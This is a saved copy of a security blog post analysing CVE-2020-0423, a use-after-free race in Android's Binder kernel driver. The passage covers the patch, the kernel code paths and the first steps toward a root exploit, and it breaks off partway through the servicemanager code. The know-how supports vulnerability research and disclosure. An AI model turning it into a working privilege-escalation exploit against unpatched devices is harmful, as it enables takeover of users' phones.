<!DOCTYPE html>
<!-- saved from url=(0043)https://blog.longterm.io/cve-2020-0423.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>Longterm Security</title>

		<!-- CSS  -->
		<link href="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/materialize.css" type="text/css" rel="stylesheet" media="screen,projection">
		<link href="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css">
		<link href="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/style.css" type="text/css" rel="stylesheet" media="screen,projection">
		<link rel="stylesheet" href="./2020 - Exploiting a Single Instruction Race Condition in Binder_files/codehilite.css">
	</head>
	<body>
		<nav class="grey darken-4" role="navigation">
			<div class="nav-wrapper container">
				<a id="logo-container" href="https://blog.longterm.io/index.html#" class="brand-logo">Longterm Security</a>
				<ul class="right hide-on-med-and-down quiet_list">
					<li><a href="https://blog.longterm.io/index.html#services">Services</a></li>
					<li><a href="https://blog.longterm.io/index.html#resources">Blog</a></li>
					<li><a href="https://medium.com/@longtermsec/" target="_blank">
						<i class="mdi mdi-medium"></i>
					</a></li>
					<li><a href="https://twitter.com/longtermsec" target="_blank">
						<i class="mdi mdi-twitter"></i>
					</a></li>
				</ul>

				<ul id="nav-mobile" class="side-nav quiet_list" style="transform: translateX(-100%);">
					<li><a href="https://blog.longterm.io/index.html#services">Services</a></li>
					<li><a href="https://blog.longterm.io/index.html#resources">Blog</a></li>
					<li><a href="https://medium.com/@longtermsec/" target="_blank">
						<!--i class="mdi mdi-medium"></i-->Blog
					</a></li>
					<li><a href="https://twitter.com/longtermsec" target="_blank">
						<!--i class="mdi mdi-twitter"></i-->Twitter
					</a></li>
				</ul>
				<a href="https://blog.longterm.io/cve-2020-0423.html#" data-activates="nav-mobile" class="button-collapse"><i class="mdi mdi-menu"></i></a>
			</div>
		</nav>



	<div id="index-resources">
		<div class="container">
			<div class="section">

				<a name="resources"></a>

				<h2 class="section-title white-text light">Exploiting a Single Instruction Race Condition in Binder</h2>
				<h4 class="grey-text center-align light">Post by Maxime Peterlin, Philip Pettersson, Alexandre Adamski, and Alex Radocea</h4>

				<div class="row">
					<div class="col s14 m12">
						<div class="card">
								<div class="card-content">
<div>
<h2 id="introduction">Introduction</h2>
<p>In the <a href="https://source.android.com/security/bulletin/2020-10-01">Android Security Bulletin of October</a>, the vulnerability <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0423">CVE-2020-0423</a> was made public with the following description:</p>
<blockquote>
<p>In binder_release_work of binder.c, there is a possible use-after-free due to improper locking. This could lead to local escalation of privilege in the kernel with no additional execution privileges needed. User interaction is not needed for exploitation.</p>
</blockquote>
<p><strong>CVE-2020-0423</strong> is <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">yet</a> <a href="https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html">another</a> vulnerability in Android that can lead to privilege escalation. In this post, we will describe the bug and construct an exploit that can be used to gain
root privileges on an Android device.</p>
<h2 id="root-cause-analysis-of-cve-2020-0423">Root Cause Analysis of CVE-2020-0423</h2>
<h3 id="a-brief-overview-of-binder">A Brief Overview of Binder</h3>
<p>Processes on Android are isolated and cannot access each other's memory directly. However they might require to, whether it's for exchanging data between a client and a server or simply to share information between two processes.</p>
<p>Interprocess communication on Android is performed by <strong>Binder</strong>. This kernel component provides a user-accessible character device which can be used to call routines in remote process and pass arguments to it. Binder acts as a proxy between two tasks and is also responsible, among others, for handling memory allocations during data exchange as well as managing shared object's lifespans.</p>
<p>If you're not familiar with Binder's internals, we invite you to read articles on the subject, such as <a href="https://www.synacktiv.com/en/publications/binder-transactions-in-the-bowels-of-the-linux-kernel">Synacktiv's "Binder Transactions In The Bowels of the Linux Kernel"</a>. It will come in handy to understand the rest of this post.</p>
<h3 id="patch-analysis-and-brief-explanation">Patch Analysis and Brief Explanation</h3>
<p>The <a href="https://github.com/torvalds/linux/commit/f3277cbfba763cd2826396521b9296de67cf1bbc#diff-8aa818b39daaf6497eaab2ec0b404bcabf43616362fe9551ed7dd2278682af08">patch</a> for CVE-2020-0423 was upstreamed on October 10th in the Linux kernel with the following commit message:</p>
<blockquote>
<p>binder: fix UAF when releasing todo list</p>
<p>When releasing a thread todo list when tearing down
a binder_proc, the following race was possible which
could result in a use-after-free:</p>
<ol>
<li>Thread 1: enter binder_release_work from binder_thread_release</li>
<li>Thread 2: binder_update_ref_for_handle() -&gt; binder_dec_node_ilocked()</li>
<li>Thread 2: dec nodeA --&gt; 0 (will free node)</li>
<li>Thread 1: ACQ inner_proc_lock</li>
<li>Thread 2: block on inner_proc_lock</li>
<li>Thread 1: dequeue work (BINDER_WORK_NODE, part of nodeA)</li>
<li>Thread 1: REL inner_proc_lock</li>
<li>Thread 2: ACQ inner_proc_lock</li>
<li>Thread 2: todo list cleanup, but work was already dequeued</li>
<li>Thread 2: free node</li>
<li>Thread 2: REL inner_proc_lock</li>
<li>Thread 1: deref w-&gt;type (UAF)</li>
</ol>
<p>The problem was that for a BINDER_WORK_NODE, the binder_work element
must not be accessed after releasing the inner_proc_lock while
processing the todo list elements since another thread might be
handling a deref on the node containing the binder_work element
leading to the node being freed.</p>
</blockquote>
<p>It gives a rough overview of the different steps required to trigger a Use-After-Free, or UAF, using this bug. These steps will be detailed in the next section, for now let's look at the patch to understand where the vulnerability comes from.</p>
<p>In essence, what this patch does is to inline the content of the function <code>binder_dequeue_work_head</code> in <code>binder_release_work</code>. The only difference being that the <code>type</code> field of the <code>binder_work</code> struct is read while the lock on <code>proc</code> is still held.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// Before the patch</span>

<span class="k">static</span> <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">binder_dequeue_work_head</span><span class="p">(</span>
                    <span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                    <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>

    <span class="n">binder_inner_proc_lock</span><span class="p">(</span><span class="n">proc</span><span class="p">);</span>
    <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head_ilocked</span><span class="p">(</span><span class="n">list</span><span class="p">);</span>
    <span class="n">binder_inner_proc_unlock</span><span class="p">(</span><span class="n">proc</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">w</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span>
        <span class="cm">/*</span>
<span class="cm">         * From this point on, there is no lock on `proc` anymore</span>
<span class="cm">         * which means `w` could have been freed in another thread and</span>
<span class="cm">         * therefore be pointing to dangling memory.</span>
<span class="cm">         */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">w</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* &lt;--- Use-after-free occurs here */</span>

<span class="c1">// [...]</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code><span class="c1">// After the patch</span>

<span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>
    <span class="k">enum</span> <span class="n">binder_work_type</span> <span class="n">wtype</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">binder_inner_proc_lock</span><span class="p">(</span><span class="n">proc</span><span class="p">);</span>
        <span class="cm">/*</span>
<span class="cm">         * Since the lock on `proc` is held while calling</span>
<span class="cm">         * `binder_dequeue_work_head_ilocked` and reading the `type` field of</span>
<span class="cm">         * the resulting `binder_work` stuct, we can be sure its value has not</span>
<span class="cm">         * been tampered with.</span>
<span class="cm">         */</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head_ilocked</span><span class="p">(</span><span class="n">list</span><span class="p">);</span>
        <span class="n">wtype</span> <span class="o">=</span> <span class="n">w</span> <span class="o">?</span> <span class="n">w</span><span class="o">-&gt;</span><span class="nl">type</span> <span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">binder_inner_proc_unlock</span><span class="p">(</span><span class="n">proc</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">wtype</span><span class="p">)</span> <span class="p">{</span> <span class="cm">/* &lt;--- Use-after-free not possible anymore */</span>

<span class="c1">// [...]</span>
</code></pre></div>

<p>Before this patch, it was possible to dequeue a <code>binder_work</code> struct, have another thread free and reallocate it to then change the control flow of <code>binder_release_work</code>. The next section will try to give a more thorough explanation as to why this behavior occurs and how it can be triggered arbitrarily.</p>
<h3 id="in-depth-analysis">In-Depth Analysis</h3>
<p>In this section, as an example, let's imagine that there are two processes communicating using binder: a sender and a receiver.</p>
<p>At this point, there are three prerequisites to trigger the bug:</p>
<ol>
<li>a call to <code>binder_release_work</code> from the sender's thread</li>
<li>a <code>binder_work</code> structure to dequeue from the sender thread's <code>todo</code> list</li>
<li>a free on the <code>binder_work</code> structure from the receiver thread</li>
</ol>
<p>Let's go over them one by one and try to figure out a way to fulfill them.</p>
<h4 id="calling-binder_release_work">Calling <code>binder_release_work</code></h4>
<p>This prerequisite is pretty straightforward. As explained earlier, <code>binder_release_work</code> is part of the clean up routine when a task is done using binder. It can be called explicitly in a thread using the ioctl command <code>BINDER_THREAD_EXIT</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// Userland code from the exploit</span>

<span class="kt">int</span> <span class="n">binder_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/binder"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
<span class="c1">// [...]</span>
<span class="n">ioctl</span><span class="p">(</span><span class="n">binder_fd</span><span class="p">,</span> <span class="n">BINDER_THREAD_EXIT</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</code></pre></div>

<p>This ioctl will end up calling the kernel function <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4977"><code>binder_ioctl</code></a> located at <code>drivers/android/binder.c</code>.</p>
<p><code>binder_ioctl</code> will then reach the <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#5038"><code>BINDER_THREAD_EXIT</code></a> case and call <code>binder_thread_release</code>. <code>thread</code> is a <code>binder_thread</code> structure containing information about the current thread which made the <code>ioctl</code> call.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">long</span> <span class="n">binder_ioctl</span><span class="p">(</span><span class="k">struct</span> <span class="nc">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">arg</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>

    <span class="k">case</span> <span class="nl">BINDER_THREAD_EXIT</span><span class="p">:</span>
        <span class="n">binder_debug</span><span class="p">(</span><span class="n">BINDER_DEBUG_THREADS</span><span class="p">,</span> <span class="s">"%d:%d exit</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                    <span class="n">proc</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span> <span class="kr">thread</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">);</span>
        <span class="n">binder_thread_release</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="kr">thread</span><span class="p">);</span>
        <span class="kr">thread</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="c1">// [...]</span>
</code></pre></div>

<p>Near the end of <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4691"><code>binder_thread_release</code></a> appears the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4772"><code>binder_release_work</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_thread_release</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                 <span class="k">struct</span> <span class="nc">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>

    <span class="n">binder_release_work</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">);</span>
    <span class="n">binder_thread_dec_tmpref</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">active_transactions</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Notice that the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#4551"><code>binder_release_work</code></a> has the value <code>&amp;thread-&gt;todo</code> for the parameter <code>struct list_head *list</code>. This will become relevant in the following section when we try to populate this list with <code>binder_work</code> structures.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_release_work</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
                <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">w</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">w</span> <span class="o">=</span> <span class="n">binder_dequeue_work_head</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">list</span><span class="p">);</span> <span class="cm">/* dequeues from thread-&gt;todo */</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">w</span><span class="p">)</span>
            <span class="k">return</span><span class="p">;</span>

    <span class="c1">// [...]</span>
</code></pre></div>

<p>Now that we know how to trigger the vulnerable function, let's determine how we can fill the <code>thread-&gt;todo</code> list with arbitrary <code>binder_work</code> structures.</p>
<h4 id="dequeueing-a-binder_work-structure-of-the-sender-thread">Dequeueing a <code>binder_work</code> Structure of the Sender Thread</h4>
<p><code>binder_work</code> structures are enqueued into <code>thread-&gt;todo</code> at two locations:</p>
<ol>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#824"><code>binder_enqueue_deferred_thread_work_ilocked</code></a></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span>
<span class="n">binder_enqueue_deferred_thread_work_ilocked</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">,</span>
                        <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">work</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">binder_enqueue_work_ilocked</span><span class="p">(</span><span class="n">work</span><span class="p">,</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<ol>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#842"><code>binder_enqueue_thread_work_ilocked</code></a></li>
</ol>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span>
<span class="n">binder_enqueue_thread_work_ilocked</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">,</span>
                   <span class="k">struct</span> <span class="nc">binder_work</span> <span class="o">*</span><span class="n">work</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">binder_enqueue_work_ilocked</span><span class="p">(</span><span class="n">work</span><span class="p">,</span> <span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">);</span>
    <span class="kr">thread</span><span class="o">-&gt;</span><span class="n">process_todo</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>These functions are used in different places in the code, but an interesting code path is the one starting in <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2524"><code>binder_translate_binder</code></a>. This function is called when a thread sends a transaction containing a <code>BINDER_TYPE_BINDER</code> or a <code>BINDER_TYPE_WEAK_BINDER</code>.</p>
<p>A binder node is created from this binder object and the reference counter for the process on the receiving end is increased. As long as the receiving process holds a reference to this node, it will stay alive in Binder's memory. However, if the process releases the reference, the node is destroyed, which is what we will try to achieve later on to trigger the UAF.</p>
<p>First, let's explain how the binder node and the <code>thread-&gt;todo</code> list are related
in the call to <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#2553"><code>binder_inc_ref_for_node</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_translate_binder</span><span class="p">(</span><span class="k">struct</span> <span class="nc">flat_binder_object</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span>
                   <span class="k">struct</span> <span class="nc">binder_transaction</span> <span class="o">*</span><span class="n">t</span><span class="p">,</span>
                   <span class="k">struct</span> <span class="nc">binder_thread</span> <span class="o">*</span><span class="kr">thread</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_inc_ref_for_node</span><span class="p">(</span><span class="n">target_proc</span><span class="p">,</span> <span class="n">node</span><span class="p">,</span>
            <span class="n">fp</span><span class="o">-&gt;</span><span class="n">hdr</span><span class="p">.</span><span class="n">type</span> <span class="o">==</span> <span class="n">BINDER_TYPE_BINDER</span><span class="p">,</span>
            <span class="o">&amp;</span><span class="kr">thread</span><span class="o">-&gt;</span><span class="n">todo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rdata</span><span class="p">);</span>
    <span class="c1">// [...]</span>
<span class="p">}</span>
</code></pre></div>

<p><code>binder_inc_ref_for_node</code> parameters are as follows:</p>
<ul>
<li><code>struct binder_proc *proc</code>: process that will hold a reference to the node</li>
<li><code>struct binder_node *node</code>: target node</li>
<li><code>bool strong</code>: true=strong reference, false=weak reference</li>
<li><code>struct list_head *target_list</code>: worklist to use if node is incremented</li>
<li><code>struct binder_ref_data *rdata</code>: the id/refcount data for the ref</li>
</ul>
<p><code>target_list</code> in our current path is <code>thread-&gt;todo</code>. This parameter is only used in <code>binder_inc_ref_for_node</code> in the call to <code>binder_inc_ref_olocked</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_inc_ref_for_node</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_proc</span> <span class="o">*</span><span class="n">proc</span><span class="p">,</span>
            <span class="k">struct</span> <span class="nc">binder_node</span> <span class="o">*</span><span class="n">node</span><span class="p">,</span>
            <span class="kt">bool</span> <span class="n">strong</span><span class="p">,</span>
            <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">target_list</span><span class="p">,</span>
            <span class="k">struct</span> <span class="nc">binder_ref_data</span> <span class="o">*</span><span class="n">rdata</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_inc_ref_olocked</span><span class="p">(</span><span class="n">ref</span><span class="p">,</span> <span class="n">strong</span><span class="p">,</span> <span class="n">target_list</span><span class="p">);</span>
    <span class="c1">// [...]</span>
<span class="p">}</span>
</code></pre></div>

<p><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1745"><code>binder_inc_ref_olocked</code></a> then calls <code>binder_inc_node</code> whether it's a weak or a strong reference.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_inc_ref_olocked</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_ref</span> <span class="o">*</span><span class="n">ref</span><span class="p">,</span> <span class="kt">int</span> <span class="n">strong</span><span class="p">,</span>
                  <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">target_list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>
            <span class="c1">// Strong ref path</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_inc_node</span><span class="p">(</span><span class="n">ref</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">target_list</span><span class="p">);</span>
    <span class="c1">// [...]</span>
            <span class="c1">// Weak ref path</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">binder_inc_node</span><span class="p">(</span><span class="n">ref</span><span class="o">-&gt;</span><span class="n">node</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">target_list</span><span class="p">);</span>
    <span class="c1">// [...]</span>

<span class="p">}</span>
</code></pre></div>

<p><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1431"><code>binder_inc_node</code></a> is a simple wrapper around <code>binder_inc_node_nilocked</code> holding a lock on the current node.</p>
<p><code>binder_inc_node_nilocked</code> finally calls:</p>
<ul>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1410"><code>binder_enqueue_deferred_thread_work_ilocked</code></a> if there is a strong reference on the node</li>
<li><a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1425"><code>binder_enqueue_work_ilocked</code></a> if there is a weak reference on the node</li>
</ul>
<p>In practice, it does not matter whether the reference is weak or strong.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">int</span> <span class="n">binder_inc_node_nilocked</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_node</span> <span class="o">*</span><span class="n">node</span><span class="p">,</span> <span class="kt">int</span> <span class="n">strong</span><span class="p">,</span>
                    <span class="kt">int</span> <span class="n">internal</span><span class="p">,</span>
                    <span class="k">struct</span> <span class="nc">list_head</span> <span class="o">*</span><span class="n">target_list</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// [...]</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">strong</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">has_strong_ref</span> <span class="o">&amp;&amp;</span> <span class="n">target_list</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// [...]</span>
            <span class="n">binder_enqueue_deferred_thread_work_ilocked</span><span class="p">(</span><span class="kr">thread</span><span class="p">,</span>
                                   <span class="o">&amp;</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">work</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">has_weak_ref</span> <span class="o">&amp;&amp;</span> <span class="n">list_empty</span><span class="p">(</span><span class="o">&amp;</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">work</span><span class="p">.</span><span class="n">entry</span><span class="p">))</span> <span class="p">{</span>
            <span class="c1">// [...]</span>
            <span class="n">binder_enqueue_work_ilocked</span><span class="p">(</span><span class="o">&amp;</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">work</span><span class="p">,</span> <span class="n">target_list</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>Notice here that it's actually the <code>node-&gt;work</code> field that is enqueued in the <code>thread-&gt;todo</code> list and not just a plain <code>binder_work</code> structure. It's because <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#319"><code>binder_node</code></a> embeds a <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#322"><code>binder_work</code></a> structure. This means that, to trigger the bug, we don't want to free a specific <code>binder_work</code> structure, but a whole <code>binder_node</code>.</p>
<p>At this stage, we know how to arbitrarily fill the <code>thread-&gt;todo</code> list and how to call the vulnerable function <code>binder_release_work</code> to access a potentially freed <code>binder_work</code>/<code>binder_node</code> structure. The only step that remains is to figure out a way to free a <code>binder_node</code> we allocated in our thread.</p>
<h4 id="freeing-the-binder_work-structure-from-the-receiver-thread">Freeing the <code>binder_work</code> Structure From the Receiver Thread</h4>
<p>Up to this point, we only looked at the sending thread's side. Now we'll explain what needs to happen on the receiving end for the node to be freed.</p>
<p>The function responsible for freeing a node is <a href="https://android.googlesource.com/kernel/common/+/13abe236365485368755fb76c57a67a9b1f640d8/drivers/android/binder.c#1376"><code>binder_free_node</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="k">static</span> <span class="kt">void</span> <span class="n">binder_free_node</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_node</span> <span class="o">*</span><span class="n">node</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">kfree</span><span class="p">(</span><span class="n">node</span><span class="p">);</span>
    <span class="n">binder_stats_deleted</span><span class="p">(</span><span class="n">BINDER_STAT_NODE</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>This function is called in different places in the code, but an interesting path to follow is when binder receives a <code>BC_FREE_BUFFER</code> transaction command. The reason for choosing this code path in particular is twofold.</p>
<ul>
<li>The first thing to note is that not all processes are allowed to register as a binder service. While it's still possible to do it by <a href="https://labs.bluefrostsecurity.de/blog/2020/04/08/cve-2020-0041-part-2-escalating-to-root/">abusing the ITokenManager service</a>, we chose to use the already registered services (e.g. <code>servicemanager</code>, <code>gpuservice</code>, etc.).</li>
<li>The second reason is that since we chose to communicate with existing services, we would have to use an existing code path inside one of those that would let us free a node. </li>
</ul>
<p>Fortunately, this is the case for <code>BC_FREE_BUFFER</code> which is used by the binder service to clean up once the transaction has been handled. An example with <a href="https://android.googlesource.com/platform/frameworks/native/+/5516d77f61c0553f20b7332842863bc511a97074/cmds/servicemanager/binder.c"><code>servicemanager</code></a> is given below.</p>
<p>In <a href="https://android.googlesource.com/platform/frameworks/native/+/5516d77f61c0553f20b7332842863bc511a97074/cmds/servicemanager/binder.c#229"><code>binder_parse</code></a>, when <a href="https://android.googlesource.com/platform/frameworks/native/+/5516d77f61c0553f20b7332842863bc511a97074/cmds/servicemanager/binder.c#256">replying to a transaction</a>, service manager will either call <code>binder_free_buffer</code>, if it's a one-way transaction, or <code>binder_send_reply</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">binder_parse</span><span class="p">(</span><span class="k">struct</span> <span class="nc">binder_state</span> <span class="o">*</span><span class="n">bs</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">binder_io</span> <span class="o">*</span><span class="n">bio</span><span class="p">,</span>
                 <span class="kt">uintptr_t</span> <span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">binder_handler</span> <span class="n">func</span><span class="p">)</span>
<span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// [...]</span>
        <span class="k">case</span> <span class="nl">BR_TRANSACTION_SEC_CTX</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">BR_TRANSACTION</span><span class="p">:</span> <span class="p">{</span>
            <span class="c1">// [...]</span>
